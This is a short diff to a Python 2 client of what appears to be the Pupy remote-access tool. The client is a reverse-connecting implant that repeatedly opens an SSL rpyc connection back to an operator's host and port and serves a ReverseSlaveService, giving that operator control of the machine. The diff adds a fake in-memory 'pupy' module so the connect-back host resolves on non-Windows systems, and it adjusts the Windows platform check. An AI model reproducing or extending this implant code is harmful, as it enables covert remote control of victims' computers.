@@ -22,6 +22,7 @@ import platform
 import re
 import ssl
 import random
+import imp
 
 
 class ReverseSlaveService(Service):
@@ -68,9 +69,19 @@ def get_next_wait(attempt):
 	else:
 		return random.randint(15,30)
 
+def add_pseudo_pupy_module(HOST):
+	if not "pupy" in sys.modules:
+		mod = imp.new_module("pupyimporter")
+		mod.__name__="pupy"
+		mod.__file__="<memimport>\\\\pupyimporter"
+		mod.__package__="pupy"
+		sys.modules["pupy"]=mod
+		mod.get_connect_back_host=(lambda : HOST)
+		mod.pseudo=True
+
 def main():
 	HOST="127.0.0.1:443"
-	if "win" in platform.system().lower():
+	if "windows" in platform.system().lower():
 		try:
 			import pupy
 			HOST=pupy.get_connect_back_host()
@@ -79,6 +90,8 @@ def main():
 			if len(sys.argv)!=2:
 				exit("usage: %s host:port"%sys.argv[0])
 			HOST=sys.argv[1]
+	else:
+		add_pseudo_pupy_module(HOST)
 	attempt=0
 	while True:
 		try:
@@ -89,7 +102,6 @@ def main():
 				rport=int(tab[1])
 			else:
 				rport=443
-
 			print "connecting to %s:%s"%(rhost,rport)
 			conn=rpyc.ssl_connect(rhost, rport, service = ReverseSlaveService)
 			while True:
